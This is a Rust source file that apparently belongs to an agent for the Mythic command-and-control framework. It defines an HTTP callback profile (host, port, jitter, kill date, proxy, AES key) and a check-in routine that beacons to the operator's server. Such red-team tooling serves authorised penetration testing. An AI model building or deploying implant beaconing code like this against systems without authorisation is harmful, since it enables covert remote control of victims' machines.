use crate::c2::unpack_mythic_message;
use crate::models::{ReqCheckin, RespCheckin};
use crate::sys::http::http_request;
use crate::{NError, NResult};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

use super::C2;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpProfile {
    pub aes_psk: Option<String>,
    pub callback_host: String,
    pub callback_interval: u64,
    pub callback_jitter: u64,
    pub callback_port: u16,
    pub encrypted_exchange_check: bool,
    pub get_uri: String,
    pub headers: HashMap<String, String>,
    pub killdate: String,
    pub post_uri: String,
    pub proxy_host: String,
    pub proxy_pass: String,
    pub proxy_port: String,
    pub proxy_user: String,
    pub query_path_name: String,
}

impl Default for HttpProfile {
    fn default() -> Self {
        Self {
            aes_psk: Some(String::new()),
            callback_host: String::new(),
            callback_interval: 0,
            callback_jitter: 0,
            callback_port: 0,
            encrypted_exchange_check: false,
            get_uri: String::new(),
            headers: HashMap::new(),
            killdate: String::new(),
            post_uri: String::new(),
            proxy_host: String::new(),
            proxy_pass: String::new(),
            proxy_port: String::new(),
            proxy_user: String::new(),
            query_path_name: String::new(),
        }
    }
}

impl C2 for HttpProfile {
    fn checkin(&self, payload_uuid: &uuid::Uuid, req: &ReqCheckin) -> NResult<RespCheckin> {
        let data = super::pack_mythic_message(payload_uuid, req).unwrap();
        let url: String = format!(
            "{}:{}/{}?{}={}",
            self.callback_host, self.callback_port, self.get_uri, self.query_path_name, data
        );
        let resp: String = http_request(&url, "GET", None).unwrap();

        let rseponse: serde_json::Value = unpack_mythic_message(&resp, payload_uuid).unwrap();
        let resp: RespCheckin = serde_json::from_value(rseponse).unwrap();
        Ok(resp)
    }
}
